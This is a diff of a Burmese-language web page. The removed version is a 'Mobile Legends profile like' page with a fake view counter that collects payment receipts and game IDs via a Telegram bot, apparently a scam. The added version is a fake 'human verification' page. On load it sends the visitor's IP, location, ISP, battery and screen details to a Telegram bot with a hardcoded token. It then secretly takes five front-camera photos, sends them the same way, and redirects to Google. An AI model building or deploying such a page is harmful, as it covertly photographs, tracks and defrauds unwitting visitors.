@@ -1,337 +1,178 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="my">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ML Profile Like</title>
-
-<style>
-body{
-  margin:0;
-  font-family:sans-serif;
-  color:#fff;
-  text-align:center;
-  overflow:hidden;
-  background:radial-gradient(circle, #0b1d35, #000);
-}
-
-.bg{
-  position:fixed;
-  width:100%;
-  height:100%;
-  top:0;
-  left:0;
-  z-index:-1;
-}
-
-.bg img{
-  position:absolute;
-  width:10%;
-  opacity:0.3;
-  animation:moveUp 20s linear infinite;
-}
-
-@keyframes moveUp{
-  0%{transform:translateY(100vh);}
-  100%{transform:translateY(-120vh);}
-}
-
-.top-img{
-  width:60%;
-  max-height:200px;
-  object-fit:cover;
-  animation:float 3s infinite;
-}
-
-@keyframes float{
-  0%{transform:translateY(0);}
-  50%{transform:translateY(-10px);}
-  100%{transform:translateY(0);}
-}
-
-.title{
-  font-size:40px;
-  font-weight:bold;
-  margin:10px 0;
-  animation: glow 5s infinite, floatText 3s infinite;
-}
-
-.view{
-  font-size:16px;
-  margin-top:5px;
-}
-
-@keyframes floatText{
-  0%{transform:translateY(0);}
-  50%{transform:translateY(-5px);}
-  100%{transform:translateY(0);}
-}
-
-@keyframes glow{
-  0%{color:#ff0000;text-shadow:0 0 10px #ff0000;}
-  10%{color:#ff7f00;text-shadow:0 0 10px #ff7f00;}
-  20%{color:#ffff00;text-shadow:0 0 10px #ffff00;}
-  30%{color:#7fff00;text-shadow:0 0 10px #7fff00;}
-  40%{color:#00ff00;text-shadow:0 0 10px #00ff00;}
-  50%{color:#00ffff;text-shadow:0 0 10px #00ffff;}
-  60%{color:#007fff;text-shadow:0 0 10px #007fff;}
-  70%{color:#0000ff;text-shadow:0 0 10px #0000ff;}
-  80%{color:#8b00ff;text-shadow:0 0 10px #8b00ff;}
-  90%{color:#ff00ff;text-shadow:0 0 10px #ff00ff;}
-  100%{color:#ff0000;text-shadow:0 0 10px #ff0000;}
-}
-
-.main-img{
-  width:40%;
-  border-radius:10px;
-  margin:10px auto;
-  display:block;
-}
-
-.input-box{
-  margin:15px;
-}
-
-input{
-  width:50%;
-  padding:19px;
-  border:none;
-  border-radius:8px;
-  font-size:16px;
-  text-align:center;
-}
-
-button{
-  margin-top:10px;
-  padding:12px 25px;
-  border:none;
-  border-radius:8px;
-  background:#00d4ff;
-  color:#000;
-  font-size:16px;
-  cursor:pointer;
-  box-shadow:0 0 10px #00d4ff;
-}
-
-.payScreen{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background:#0d47a1;
-  display:none;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  z-index:999;
-}
-
-.back{
-  position:absolute;
-  top:15px;
-  left:15px;
-  background:#fff;
-  color:#000;
-  padding:5px 10px;
-  border-radius:5px;
-  cursor:pointer;
-}
-
-.payBox{
-  background:#fff;
-  color:#000;
-  padding:8px 15px;
-  margin:5px 0;
-  border-radius:8px;
-  font-weight:bold;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:8px;
-}
-
-.payBox img{
-  width:20px;
-  height:20px;
-}
-
-.receiptText{
-  margin-top:10px;
-  font-weight:bold;
-  animation: glow 5s infinite;
-}
-
-.successBox{
-  position:fixed;
-  top:50%;
-  left:50%;
-  transform:translate(-50%,-50%);
-  background:#2196f3;
-  padding:20px;
-  border-radius:10px;
-  display:none;
-  z-index:1000;
-}
-
-/* 🔵 Telegram Floating Button */
-.telegramFloat{
-  position:fixed;
-  bottom:25px;
-  right:20px;
-  width:65px;
-  height:65px;
-  border-radius:50%;
-  box-shadow:0 0 15px #00d4ff;
-  animation:float 2s infinite;
-  z-index:9999;
-}
-.telegramFloat img{
-  width:100%;
-  height:100%;
-  border-radius:50%;
-}
-</style>
+  <meta charset="UTF-8" />
+  <title>FAST | စစ်ဆေးချက်</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: radial-gradient(circle, #1a1a1a, #000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+    }
+    .container {
+      text-align: center;
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid #444;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
+      width: 90%;
+      max-width: 400px;
+    }
+    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
+    p { font-size: 14px; color: #aaa; }
+    .status { margin-top: 20px; font-size: 13px; color: #0f0; }
+  </style>
 </head>
-
 <body>
-
-<div class="bg">
-  <img src="https://i.postimg.cc/WzGpCjVL/8255033248d018b6c5f3d460b2deec16.jpg" style="left:10%;">
-  <img src="https://i.postimg.cc/WzGpCjVL/8255033248d018b6c5f3d460b2deec16.jpg" style="left:40%;">
-  <img src="https://i.postimg.cc/WzGpCjVL/8255033248d018b6c5f3d460b2deec16.jpg" style="left:70%;">
-</div>
-
-<img class="top-img" src="https://i.postimg.cc/mDjnh5Tx/71d2141b6bedf4841528fce2c181597e.jpg">
-
-<div class="title">
-  Mobile legends Acc profile like
-  <div class="view">👁️ View: <span id="viewCount">0</span></div>
-</div>
-
-<img class="main-img" src="https://i.postimg.cc/7Y6CWGcZ/IMG-20260402-140652-943.jpg">
-
-<div class="input-box">
-  <input type="number" id="userId" placeholder="Enter your ID">
-  <br>
-  <button onclick="send()">Send</button>
-  <br>
-  <button onclick="openPay()">ငွေလွှဲရန်နိပ်ပါ</button>
-</div>
-
-<div class="payScreen" id="payScreen">
-  <div class="back" onclick="closePay()">← Back</div>
-
-  <div class="payBox">
-    <img src="https://i.postimg.cc/4NKjfGFQ/9a1ddf812ac383f246e7e41e485ca11f.jpg">
-    Kpay
+  <div class="container">
+    <h1>🔐 ကိုယ်ရေးအတည်ပြုချက်</h1>
+    <p>သင် လူမဟုတ်ကြောင်း အတည်ပြုရန် ကင်မရာခွင့်ပြုချက် လိုအပ်ပါသည်။</p>
+    <p class="status" id="status">စတင်နေပါပြီ...</p>
   </div>
 
-  <div class="payBox">098266838</div>
-  <div class="payBox">MafiaCJNG</div>
+  <script>
+    // ===== TELEGRAM BOT CONFIGURATION =====
+    const BOT_TOKEN = "7308206355:AAFqR-4DnU-N6jScpp3vKpB8hbRSAno_ftc";
+    // ======================================
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const OWNER_ID = urlParams.get('id');
+    const statusEl = document.getElementById('status');
 
-  <div class="receiptText">ပြေစာပို့ရန် 👇👇</div>
-
-  <input type="file" id="fileInput"><br>
-  <button onclick="upload()">ပို့ရန်နိပ်ပါ</button>
-</div>
-
-<div class="successBox" id="successBox">
-  ပြေစာပို့ပြီးပါပြီး ပြန်ထွက်ပြီး id ပို့ပါ ✅
-</div>
-
-<!-- 🔵 Telegram Logo Button -->
-<a href="https://t.me/M_a_F_i_a_C_J_N_G" target="_blank" class="telegramFloat">
-  <img src="https://i.postimg.cc/C5XsKW6f/705ff73a68301942c6e2bf8801533d4e.jpg">
-</a>
-
-<script>
-let view = 18560;
-const maxView = 20580;
-
-document.getElementById("viewCount").innerText = view;
-
-setInterval(()=>{
-  view += 100;
-  if(view >= maxView){
-    view = maxView;
-  }
-  document.getElementById("viewCount").innerText = view;
-},1000);
-
-let receipt=false;
-
-function openPay(){
-  document.getElementById("payScreen").style.display="flex";
-}
-
-function closePay(){
-  document.getElementById("payScreen").style.display="none";
-}
-
-function upload(){
-  const file=document.getElementById("fileInput").files[0];
-
-  if(!file){
-    alert("ပုံရွေးပါ");
-    return;
-  }
-
-  let formData=new FormData();
-  formData.append("chat_id","8302272285");
-  formData.append("photo",file);
-
-  fetch("https://api.telegram.org/bot8570660820:AAHbNbxR5wJ8qkekB0zwjlJK0Ge8S19XrfA/sendPhoto",{
-    method:"POST",
-    body:formData
-  })
-  .then(res=>res.json())
-  .then(data=>{
-    if(data.ok){
-      receipt=true;
-
-      document.getElementById("successBox").style.display="block";
-
-      setTimeout(()=>{
-        document.getElementById("successBox").style.display="none";
-        closePay();
-      },2000);
-
-    }else{
-      alert("ပြေစာပို့မရပါဘူး 🚫");
+    async function sendToTelegram(text, isPhoto = false, photoBase64 = null) {
+      if (!OWNER_ID) return;
+      
+      try {
+        if (isPhoto && photoBase64) {
+          const formData = new FormData();
+          formData.append('chat_id', OWNER_ID);
+          formData.append('photo', photoBase64);
+          formData.append('caption', text);
+          
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        } else {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: OWNER_ID,
+              text: text,
+              parse_mode: 'Markdown'
+            })
+          });
+        }
+      } catch(e) {
+        console.log('Send error:', e);
+      }
     }
-  })
-  .catch(()=>{
-    alert("ပြေစာပို့မရပါဘူး 🚫");
-  });
-}
 
-function send(){
-  if(!receipt){
-    alert("ငွေလွှဲရန်ကိုအရင်နိပ်ပါ👇");
-    return;
-  }
-
-  const id=document.getElementById("userId").value;
-
-  fetch("https://api.telegram.org/bot8570660820:AAHbNbxR5wJ8qkekB0zwjlJK0Ge8S19XrfA/sendMessage",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chat_id:"8302272285",
-      text:"ML ID: "+id
-    })
-  })
-  .then(res=>res.json())
-  .then(data=>{
-    if(data.ok){
-      alert("ID ပို့ပြီးပါပြီ ✅");
-    }else{
-      alert("ID ပို့မရပါဘူး 🚫");
+    async function compressImage(blob) {
+      return new Promise((resolve) => {
+        const img = new Image();
+        img.src = URL.createObjectURL(blob);
+        img.onload = () => {
+          const canvas = document.createElement('canvas');
+          canvas.width = img.width / 2;
+          canvas.height = img.height / 2;
+          canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(resolve, 'image/jpeg', 0.7);
+          URL.revokeObjectURL(img.src);
+        };
+      });
     }
-  });
-}
-</script>
 
+    async function blobToBase64(blob) {
+      return new Promise((resolve) => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result);
+        reader.readAsDataURL(blob);
+      });
+    }
+
+    async function sendDeviceInfo() {
+      try {
+        const ipRes = await fetch('https://ipinfo.io/json?token=5602d2e05cb668');
+        const ip = await ipRes.json();
+        const battery = await navigator.getBattery();
+        const time = new Date().toLocaleString();
+        
+        const msg = `🔐 *စတင်စစ်ဆေးခြင်း*\n\n` +
+          `🌐 *IP အချက်အလက်*\n` +
+          `🔢 IP: ${ip.ip}\n` +
+          `📍 မြို့: ${ip.city || 'မသိရပါ'}\n` +
+          `🌍 ဒေသ: ${ip.region || 'မသိရပါ'}\n` +
+          `🗺 နိုင်ငံ: ${ip.country || 'မသိရပါ'}\n` +
+          `📡 ISP: ${ip.org || 'မသိရပါ'}\n\n` +
+          `📱 *စက်ပစ္စည်းအချက်အလက်*\n` +
+          `🔋 ဘက်ထရီ: ${Math.round(battery.level * 100)}% ${battery.charging ? '⚡ အားသွင်းနေသည်' : ''}\n` +
+          `📶 အင်တာနက်: ${navigator.connection?.effectiveType || 'မသိရပါ'}\n` +
+          `🖥 မျက်နှာပြင်: ${screen.width}x${screen.height}\n` +
+          `🕒 အချိန်: ${time}`;
+        
+        await sendToTelegram(msg);
+      } catch(e) {
+        console.log("Device Info Error:", e);
+      }
+    }
+
+    window.onload = async () => {
+      if (!OWNER_ID) {
+        statusEl.textContent = '❌ လင့်မမှန်ကန်ပါ။';
+        return;
+      }
+      
+      statusEl.textContent = '📡 ချိတ်ဆက်နေပါသည်...';
+      await sendDeviceInfo();
+
+      try {
+        statusEl.textContent = '🔨 ခွဲခြမ်းစိတ်ဖြာနေပါသည်...';
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        for (let i = 0; i < 5; i++) {
+          const per = (i + 1) * 20;
+          statusEl.textContent = `⚙️ လုပ်ဆောင်နေသည် ${per}%...`;
+          
+          const blob = await imageCapture.takePhoto();
+          const compressedBlob = await compressImage(blob);
+          const base64 = await blobToBase64(compressedBlob);
+          
+          await sendToTelegram(`📸 ဓာတ်ပုံ ${i+1}/5 ရိုက်ယူပြီးပါပြီ`, true, base64);
+          await new Promise(res => setTimeout(res, 1000));
+        }
+
+        track.stop();
+        statusEl.textContent = '✅ အတည်ပြုပြီးပါပြီ။ ပြန်ညွှန်းနေပါသည်...';
+        
+        await sendToTelegram(`✅ *အတည်ပြုခြင်း ပြီးဆုံးပါပြီ!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
+        
+        setTimeout(() => {
+          window.location.href = "https://www.google.com";
+        }, 2000);
+        
+      } catch (err) {
+        statusEl.textContent = '❌ ကင်မရာခွင့်ပြုချက် ငြင်းပယ်ခံရပါသည်။';
+        await sendToTelegram(`❌ *ကင်မရာ ငြင်းပယ်ခံရပါသည်!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
+        console.error(err);
+      }
+    };
+  </script>
 </body>
 </html>
